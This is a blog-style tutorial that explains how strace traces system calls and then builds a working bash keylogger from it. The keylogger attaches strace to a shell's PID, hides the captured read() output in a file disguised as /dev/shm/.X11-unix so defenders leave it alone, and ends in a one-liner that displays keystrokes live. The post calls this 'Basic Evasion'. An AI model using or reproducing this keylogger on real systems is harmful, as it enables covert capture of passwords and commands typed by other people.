---
title: Strace - Bash Keylogger
date: 2021-11-17 00:00:00 +0000
categories: [Linux, Tools, Offensive]
tags: [Linux, Tools, Offensive]
toc: true
published: true
---


## Introduction

System calls are used by processes to interact with the kernel. This means if a process wants to read or write to a file, they must make a system call to do so.

To see this in practice, we'll use `strace`.
`strace` simply traces system calls, and is primarily used for debugging purposes. 

For this demonstration we'll use the basic command echo:
```bash
echo "Freddie" > /tmp/demo.file
```

This command simply writes the string "Freddie" to the temporary file `/tmp/demo.file`

We can use `strace` to trace what system calls are being called during the execution of this command.

In order for `strace` to trace the bash redirect, we must attach `strace` to the parent bash process, instead of just the `echo` command.

- `strace -p [pid]` attaches to a PID (Process ID)
- `$$` in bash is the current process's PID (or the bash shell)

![](/assets/images/strace/strace-output-1.png)



When we paste and run our command in the above bash terminal, we are greeted with an overwhelming amount of data. 

If we ignore the irrelevant (for the purposes of this demonstration) system calls made by bash and search for our input we can see two key system calls are made. 

![](/assets/images/strace/strace-output-2.png)


`openat()` - This opens `/tmp/demo.file` with the 0666 permissions.
`write()` - This core system call writes the string `Freddie\n` to the opened file. 

It is worth noting the newline is appended by default by the echo command - we can remove that with `echo -n [string]` if necessary. 


If you have been following the commands, you may have noticed something interesting when tracing the bash process. 

![](/assets/images/strace/strace-output-3.png)

When we type commands into the bash shell above, each character can be seen in both the `read` and `write` system calls. From this simple observation we can process the strace output to create a very rudimentary bash keylogger. 
<br>

### Basic Keylogger

As seen by the previous strace example, a large amount of unimportant system calls are also generated. To filter only the system calls we want, we can use the `-e [syscall]` flag with strace.

We will select the `read` system call to detect all keys entered.

![](/assets/images/strace/strace-output-8.png)

This looks much better. 

Now, let's try to extract input in a more readable format.
This is where the fun(?) begins. 

![](/assets/images/strace/strace-output-7.png)

If we try to pipe our strace output to any text processing commands, nothing.
After a considerable amount of head banging and stack overflow researching, this is due to the fact `strace` writes all it's output to `stderr`. 

![](/assets/images/strace/strace-output-6.png)

With a little more help from stack overflow (I fear any man who can remember regex), each character inside the quotes can be extracted. 

![](/assets/images/strace/strace-output-9.png)

This is when another *slight* issue arises. Due to some linux black magic, if you pipe the output of strace to grep, it is "buffered", and cannot be easily piped into further commands. 
<br>

To get around this technical issue, we can output strace to a file in the background, then read the file and perform operations on that output. 

### Basic Evasion

```bash
strace -e read -p [pid] -o /dev/shm/.X11-unix
```

The above command creates a hidden file in `/dev/shm`. The `/dev/shm` directory lives only in live memory, and is volatile. This makes it great for writing files we don't want to be found, as the folder is wiped on restart. 

`X11` is a linux graphics display, and `.X11-unix` is it's config file.

From experience you should not delete that (the real) file - bad things happens.

This taps into the primal instinct of "bugger I won't delete that again" to prevent defenders from ***not*** deleting our keylogger file >:)

<br>

```bash
strace -e read -p [PID] -o /dev/shm/.X11-unix &
cat /dev/shm/.X11-unix
```


We can background the `strace` command, then read the hidden file in order to parse it correctly.
<br>

### Parsing

Now, all that is needed to be done is to parse the strace output in a readable manner. 

```bash
strace -e read -p 1239419 -o /dev/shm/.X11-unix &
cat /dev/shm/.X11-unix | grep -oa -E '"(.*?)"' | sed 's/^.\(.*\).$/\1/' | tr -d "\n" | sed -e "s/\\\r/\n/g" 
```
<br>

If we wrap the `cat` command using `watch` to continually update it, we can see captured keystrokes in live time.

```bash
watch -n 0.1 'cat [command]'
```
<br>

```bash
strace -e read -p 1239419 -o /dev/shm/.X11-unix &
watch -n 0.1 "cat /dev/shm/.X11-unix | grep -oa -E '\"(.*?)\"' | sed 's/^.\(.*\).$/\1/' | tr -d '\n' | sed -e 's/\\\r/\n/g'"
```

The result:

![](keylogger-in-action.png)

Voila!

The final step to construct our janky bash keylogger, is to concatenate it into a glorious one-liner:

```bash
strace -e read -p [PID] -o /dev/shm/.X11-unix & watch -n 0.1 "cat /dev/shm/.X11-unix | grep -oa -E '\"(.*?)\"' | sed 's/^.\(.*\).$/\1/' | tr -d '\n' | sed -e 's/\\\r/\n/g'"
```

We now have a functioning keylogger, that operates off a commonly installed debugging tool `strace`!
<br>
### Conclusion

If there's any takeaway messages from this absolute abomination of a script and article, it's that there is almost nothing that Stack Overflow and a little glue can't fix™
